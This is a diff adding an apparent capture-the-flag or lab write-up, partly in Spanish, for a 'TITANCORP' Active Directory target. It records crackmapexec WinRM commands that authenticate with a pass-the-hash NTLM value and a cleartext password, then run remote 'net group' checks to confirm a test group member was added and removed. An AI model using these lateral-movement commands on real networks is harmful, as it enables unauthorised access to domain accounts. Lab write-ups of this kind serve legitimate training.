@@ -1,0 +1,27 @@
+### Data-Analytics-Ops
+$ crackmapexec winrm 172.16.202.131 -u d.morales -H c5944a4b... \
+    -x 'net group Data-Analytics-Ops /domain'
+Group name     Data-Analytics-Ops
+Members
+-------------------------------------------------------------------------------
+d.morales                titan_api
+
+### Core-Infrastructure-Admins
+$ crackmapexec winrm 172.16.202.131 -u titan_api -p 'Password123' \
+    -x 'net group Core-Infrastructure-Admins /domain'
+Group name     Core-Infrastructure-Admins
+Members
+-------------------------------------------------------------------------------
+s.velez                  titan_api
+
+### Comprobacion final
+$ crackmapexec winrm 172.16.202.131 -u titan_api -p 'Password123' \
+    -x 'net group Data-Analytics-Ops /domain & net group Core-Infrastructure-Admins /domain'
+[+] Data-Analytics-Ops: d.morales, titan_api
+[+] Core-Infrastructure-Admins: s.velez, titan_api
+[+] estudiante no aparece en ninguno de los dos grupos.
+[+] La validacion solo anadio y elimino el miembro de prueba; no se crearon
+    cuentas, equipos ni tareas.
+[+] Los dos grupos quedaron con sus miembros originales.
+
+[!] No hay validador oficial de TITANCORP. La bandera se leyo del fichero master.
